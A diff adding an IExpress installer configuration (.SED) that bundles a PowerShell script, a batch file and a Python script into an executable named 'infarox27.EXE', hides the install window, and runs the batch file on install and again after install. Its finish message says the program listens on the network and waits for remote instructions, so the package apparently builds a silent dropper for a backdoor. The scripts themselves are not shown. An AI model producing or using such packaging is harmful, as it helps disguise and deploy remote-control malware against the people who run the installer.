@@ -1,0 +1,41 @@
+[Version]
+Class=IEXPRESS
+SEDVersion=3
+[Options]
+PackagePurpose=InstallApp
+ShowInstallProgramWindow=0
+HideExtractAnimation=0
+UseLongFileName=0
+InsideCompressed=0
+CAB_FixedSize=0
+CAB_ResvCodeSigning=0
+RebootMode=I
+InstallPrompt=%InstallPrompt%
+DisplayLicense=%DisplayLicense%
+FinishMessage=%FinishMessage%
+TargetName=%TargetName%
+FriendlyName=%FriendlyName%
+AppLaunched=%AppLaunched%
+PostInstallCmd=%PostInstallCmd%
+AdminQuietInstCmd=%AdminQuietInstCmd%
+UserQuietInstCmd=%UserQuietInstCmd%
+SourceFiles=SourceFiles
+[Strings]
+InstallPrompt=
+DisplayLicense=
+FinishMessage=As a cyberpunk, I view this script as a symbol of the power dynamics at play in a world where technology reigns supreme. The program listens to the network, eagerly awaiting instructions from whoever is on the other end of the line. It is a tool, waiting to be wielded by whoever has the knowledge and the power to do so. In this world of code and connections, whoever controls the data, controls the game.
+TargetName=C:\Users\bigol\Downloads\infarox\infarox27.EXE
+FriendlyName=Infarox27
+AppLaunched=start stx5.bat
+PostInstallCmd=start stx5.bat
+AdminQuietInstCmd=
+UserQuietInstCmd=
+FILE0="yani.ps1"
+FILE1="stx5.bat"
+FILE2="isc.py"
+[SourceFiles]
+SourceFiles0=C:\Users\bigol\Downloads\infarox\
+[SourceFiles0]
+%FILE0%=
+%FILE1%=
+%FILE2%=
